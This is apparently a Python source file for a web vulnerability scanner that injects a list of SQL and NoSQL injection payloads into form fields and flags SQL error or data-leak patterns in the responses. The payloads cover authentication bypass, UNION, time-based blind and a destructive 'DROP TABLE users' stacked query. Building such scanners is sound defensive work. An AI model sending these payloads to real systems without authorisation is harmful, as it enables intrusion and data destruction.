"""
SQL Injection Scanner — Tests input fields for SQL injection vulnerabilities.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass

import httpx

logger = logging.getLogger("zerotrust.scanners.sqli")


# SQL injection test payloads
SQLI_PAYLOADS = [
    # Authentication bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "' OR 1=1 --",
    "' OR 1=1#",
    "1' OR '1'='1",
    # Union-based injection
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1,2,3 --",
    # Error-based injection
    "' AND 1=CONVERT(int, @@version) --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    # Time-based blind
    "' OR SLEEP(2) --",
    "'; WAITFOR DELAY '0:0:2' --",
    # Stacked queries
    "'; DROP TABLE users --",
    "'; SELECT * FROM users --",
    # NoSQL injection
    '{"$gt": ""}',
    '{"$ne": null}',
]

# Patterns indicating SQL error messages in responses
SQL_ERROR_PATTERNS = [
    re.compile(r"sql syntax", re.IGNORECASE),
    re.compile(r"mysql_fetch", re.IGNORECASE),
    re.compile(r"mysql_num_rows", re.IGNORECASE),
    re.compile(r"mysql_connect", re.IGNORECASE),
    re.compile(r"pg_query", re.IGNORECASE),
    re.compile(r"pg_exec", re.IGNORECASE),
    re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
    re.compile(r"ORA-\d{5}", re.IGNORECASE),
    re.compile(r"Oracle.*error", re.IGNORECASE),
    re.compile(r"Microsoft.*SQL.*Server", re.IGNORECASE),
    re.compile(r"ODBC.*Driver", re.IGNORECASE),
    re.compile(r"SQLite.*error", re.IGNORECASE),
    re.compile(r"sqlite3\.OperationalError", re.IGNORECASE),
    re.compile(r"Unclosed quotation mark", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    re.compile(r"ER_PARSE_ERROR", re.IGNORECASE),
    re.compile(r"SELECT.*FROM.*WHERE", re.IGNORECASE),
    re.compile(r"INSERT INTO", re.IGNORECASE),
    re.compile(r"syntax error.*near", re.IGNORECASE),
    re.compile(r"Query.*failed", re.IGNORECASE),
    re.compile(r"Table.*doesn.*exist", re.IGNORECASE),
    re.compile(r"Unknown column", re.IGNORECASE),
    re.compile(r"columns:.*id.*username.*password", re.IGNORECASE),
    re.compile(r"database:.*production", re.IGNORECASE),
]

# Patterns indicating information disclosure through SQL errors
SQL_INFO_LEAK_PATTERNS = [
    re.compile(r"columns?:.*(?:password|email|ssn|salary)", re.IGNORECASE),
    re.compile(r"(?:db|database)[-_.]?(?:prod|production|main)", re.IGNORECASE),
    re.compile(r"(?:MySQL|PostgreSQL|MSSQL|Oracle)\s+\d+\.\d+", re.IGNORECASE),
    re.compile(r"running on\s+[\w.-]+:\d+", re.IGNORECASE),
    re.compile(r"Server:\s*(?:MySQL|PostgreSQL|MariaDB)", re.IGNORECASE),
]


@dataclass
class SQLiResult:
    """Result of a single SQL injection test."""
    url: str
    parameter: str
    payload: str
    is_vulnerable: bool
    error_based: bool
    info_leaked: bool
    evidence: str
    method: str
    matched_patterns: list[str]


class SQLiScanner:
    """Tests forms and parameters for SQL injection vulnerabilities."""

    def __init__(self, custom_headers: dict[str, str] | None = None) -> None:
        self.custom_headers = custom_headers or {}

    async def scan_form(
        self,
        action_url: str,
        method: str,
        fields: list[dict],
    ) -> list[SQLiResult]:
        """Test a form's fields for SQL injection."""
        results: list[SQLiResult] = []

        injectable_fields = [
            f for f in fields
            if f.get("field_type", "text") in ("text", "password", "email", "hidden", "search", "textarea")
        ]

        if not injectable_fields:
            return results

        async with httpx.AsyncClient(
            timeout=15.0, follow_redirects=True, verify=False,
            headers={"User-Agent": "Mozilla/5.0", **self.custom_headers},
        ) as client:
            # First, get a baseline response
            baseline = await self._get_baseline(client, action_url, method, fields)

            for field_info in injectable_fields:
                for payload in SQLI_PAYLOADS:
                    try:
                        result = await self._test_sqli(
                            client, action_url, method,
                            field_info["name"], payload, fields, baseline,
                        )
                        if result.is_vulnerable:
                            results.append(result)
                            break  # Found vulnerability in this field, move on
                    except Exception as exc:
                        logger.debug("SQLi test error on %s/%s: %s", action_url, field_info["name"], exc)

        logger.info("SQLi scan on %s: found %d vulnerable params", action_url, len(results))
        return results

    async def _get_baseline(
        self, client: httpx.AsyncClient, url: str, method: str, fields: list[dict],
    ) -> str:
        """Get a baseline response with normal input."""
        form_data = {f["name"]: f.get("value", "") or "testuser" for f in fields}
        try:
            if method.upper() == "POST":
                resp = await client.post(url, data=form_data)
            else:
                resp = await client.get(url, params=form_data)
            return resp.text
        except Exception:
            return ""

    async def _test_sqli(
        self,
        client: httpx.AsyncClient,
        action_url: str,
        method: str,
        target_field: str,
        payload: str,
        all_fields: list[dict],
        baseline: str,
    ) -> SQLiResult:
        """Send a single SQLi payload and analyze the response."""
        form_data = {}
        for f in all_fields:
            if f["name"] == target_field:
                form_data[f["name"]] = payload
            else:
                form_data[f["name"]] = f.get("value", "") or "testuser"

        if method.upper() == "POST":
            resp = await client.post(action_url, data=form_data)
        else:
            resp = await client.get(action_url, params=form_data)

        response_text = resp.text
        matched_patterns: list[str] = []
        error_based = False
        info_leaked = False

        # Check for SQL error patterns
        for pattern in SQL_ERROR_PATTERNS:
            m = pattern.search(response_text)
            if m:
                error_based = True
                matched_patterns.append(f"sql_error:{m.group()[:50]}")

        # Check for information leakage
        for pattern in SQL_INFO_LEAK_PATTERNS:
            m = pattern.search(response_text)
            if m:
                info_leaked = True
                matched_patterns.append(f"info_leak:{m.group()[:50]}")

        # Check for behavioral differences (auth bypass)
        if len(response_text) != len(baseline) and abs(len(response_text) - len(baseline)) > 100:
            # Significant response change could indicate injection
            if "welcome" in response_text.lower() or "success" in response_text.lower():
                matched_patterns.append("behavior:auth_bypass_suspected")

        is_vulnerable = error_based or info_leaked or len(matched_patterns) >= 2

        evidence = ""
        if matched_patterns:
            # Extract context around the first match
            for pattern in SQL_ERROR_PATTERNS + SQL_INFO_LEAK_PATTERNS:
                m = pattern.search(response_text)
                if m:
                    start = max(0, m.start() - 80)
                    end = min(len(response_text), m.end() + 80)
                    evidence = f"...{response_text[start:end]}..."
                    break

        return SQLiResult(
            url=action_url,
            parameter=target_field,
            payload=payload,
            is_vulnerable=is_vulnerable,
            error_based=error_based,
            info_leaked=info_leaked,
            evidence=evidence,
            method=method,
            matched_patterns=matched_patterns,
        )
